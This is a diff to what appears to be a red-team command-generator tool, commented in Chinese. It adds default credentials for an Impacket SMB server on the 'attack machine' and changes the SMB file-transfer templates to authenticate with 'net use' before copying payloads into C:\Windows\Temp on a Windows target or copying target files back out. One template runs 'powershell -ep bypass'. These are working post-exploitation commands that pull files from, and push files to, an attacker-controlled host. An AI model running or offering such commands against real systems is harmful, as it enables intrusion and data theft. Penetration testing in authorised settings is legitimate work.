@@ -11,6 +11,9 @@ import { q, v } from '../../lib/auth';
 const lhost = (p: Profile): string => v(p.localIP, 'LHOST');
 const lport = (p: Profile): string => v(p.localPort, 'LPORT');
 const fname = (p: Profile): string => v(p.fileName, 'FILE');
+/** 攻击机本地 SMB 共享认证账号 (与目标凭证无关)，默认 kaada/kaada */
+const luser = (p: Profile): string => p.localUser?.trim() || 'kaada';
+const lpass = (p: Profile): string => p.localPass?.trim() || 'kaada';
 /** 目标端落地完整路径 */
 const rpath = (p: Profile): string =>
   p.remotePath?.trim() ? p.remotePath : `C:\\Windows\\Temp\\${v(p.fileName, 'FILE')}`;
@@ -31,8 +34,8 @@ export const filetransferTools: Tool[] = [
       {
         id: 'ft-host-smbserver',
         title: 'Impacket SMB 服务 (攻击机)',
-        description: '共享当前目录，share 名为 share',
-        build: () => `impacket-smbserver share $(pwd) -smb2support`,
+        description: '共享当前目录，share 名为 share，认证账号取"本地服务账号/口令"(默认 kaada/kaada，与目标凭证无关)',
+        build: (p) => `impacket-smbserver share $(pwd) -smb2support -username ${luser(p)} -password ${q(lpass(p))}`,
       },
       {
         id: 'ft-host-upload',
@@ -107,27 +110,31 @@ export const filetransferTools: Tool[] = [
     id: 'ft-smb',
     name: 'SMB 共享传输',
     category: 'filetransfer',
-    description: '配合 impacket-smbserver，走 445 端口 (内网友好)',
+    description: '配合 impacket-smbserver (认证取本地服务账号/口令，默认 kaada/kaada)，走 445 端口 (内网友好)；若提示多重连接先 net use * /del /y',
     commands: [
       {
         id: 'ft-smb-copy-dl',
         title: 'copy 从共享下载 (CMD)',
-        build: (p) => `copy \\\\${lhost(p)}\\share\\${fname(p)} "${rpath(p)}"`,
+        description: '先 net use 建立认证连接，再 copy',
+        build: (p) => `net use \\\\${lhost(p)}\\share ${lpass(p)} /user:${luser(p)} && copy \\\\${lhost(p)}\\share\\${fname(p)} "${rpath(p)}"`,
       },
       {
         id: 'ft-smb-ps-dl',
         title: 'Copy-Item 从共享下载 (CMD 单行)',
-        build: (p) => `powershell -ep bypass -c "Copy-Item '\\\\${lhost(p)}\\share\\${fname(p)}' -Destination '${rpath(p)}'"`,
+        description: '先 net use 建立认证连接，再 Copy-Item',
+        build: (p) => `net use \\\\${lhost(p)}\\share ${lpass(p)} /user:${luser(p)} && powershell -ep bypass -c "Copy-Item '\\\\${lhost(p)}\\share\\${fname(p)}' -Destination '${rpath(p)}'"`,
       },
       {
         id: 'ft-smb-copy-ul',
         title: 'copy 上传到共享 (CMD)',
-        build: (p) => `copy "${rpath(p)}" \\\\${lhost(p)}\\share\\${fname(p)}`,
+        description: '先 net use 建立认证连接，再 copy',
+        build: (p) => `net use \\\\${lhost(p)}\\share ${lpass(p)} /user:${luser(p)} && copy "${rpath(p)}" \\\\${lhost(p)}\\share\\${fname(p)}`,
       },
       {
         id: 'ft-smb-xcopy',
         title: 'xcopy 目录传输 (CMD)',
-        build: (p) => `xcopy \\\\${lhost(p)}\\share\\${v(p.fileName, 'DIR')} "${p.remotePath?.trim() ? p.remotePath : `C:\\Windows\\Temp\\${v(p.fileName, 'DIR')}`}" /E /I /H`,
+        description: '先 net use 建立认证连接，再 xcopy',
+        build: (p) => `net use \\\\${lhost(p)}\\share ${lpass(p)} /user:${luser(p)} && xcopy \\\\${lhost(p)}\\share\\${v(p.fileName, 'DIR')} "${p.remotePath?.trim() ? p.remotePath : `C:\\Windows\\Temp\\${v(p.fileName, 'DIR')}`}" /E /I /H`,
       },
     ],
   },
